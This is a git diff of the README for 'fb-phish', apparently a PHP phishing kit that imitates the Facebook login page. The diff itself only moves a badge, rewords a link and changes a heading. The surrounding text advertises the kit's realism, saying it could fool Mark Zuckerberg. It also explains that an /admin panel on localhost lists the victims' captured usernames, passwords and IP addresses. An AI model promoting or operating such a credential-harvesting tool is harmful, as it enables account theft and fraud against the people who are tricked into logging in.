@@ -12,9 +12,9 @@
 
 ## New Version✅ - 6th March,2024
 Recently I changed the structure of the Tool, using PHP 100%. Running in all OS (*Linux, Windows, Termux and etc*).
-[![confidence-svg](https://svg-go-production.up.railway.app/api/svg?name1=Languages+Used&name2=PHP=89,JavaScript=5,CSS=3,Bash=1,Html=2)](https://github.com/isaka-james/svg-top)
 
-[More stuffs added!](https://github.com/isaka-james/fb-phish#whats-new)
+
+[See stuffs added!](https://github.com/isaka-james/fb-phish#whats-new)
 
 
 ## Authors 🕵🏿‍♂️
@@ -33,6 +33,10 @@ Recently I changed the structure of the Tool, using PHP 100%. Running in all OS 
   - [x]  New User Interface resembling to the today's Facebook interface!. (Jan,2024)
   - [x]  Removed all the facebook links, now everything runs locally!.
 
+### Languages used:
+No framework was used!, Only **PHP**!
+
+[![language-svg](https://svg-go-production.up.railway.app/api/svg?name1=Languages+Used&name2=PHP=89,JavaScript=5,CSS=3,Bash=1,Html=2)](https://github.com/isaka-james/svg-top)
 
 ## My anonymous friend's comment: 💭
 *This login page is so well-crafted that even Mark Zuckerberg himself might be fooled. The design is flawless, the user experience is seamless, and the security measures are top-notch that It has no connections link with Facebook, So when you use, you feel like **anonymous hacker** !. It's like the perfect replica, so identical to the real thing that even the creator of Facebook would have a hard time telling the difference.*
@@ -71,7 +75,7 @@ bash command.sh       # this script contains the code for autoreload the live fi
 ```
 
 
-##### Admin Pannel:
+## Admin Pannel:
 When you want to view the user logins( *username and password* ) through web interface, On the bottom of the login page there is a little box when you clicked that you will be redirected to the */admin* , where you will meet the table with all the user logins.
 
 Or simply navigate to *http://localhost:8080/admin* for viewing the admin pannel containing the username, passwords, IP address and more.
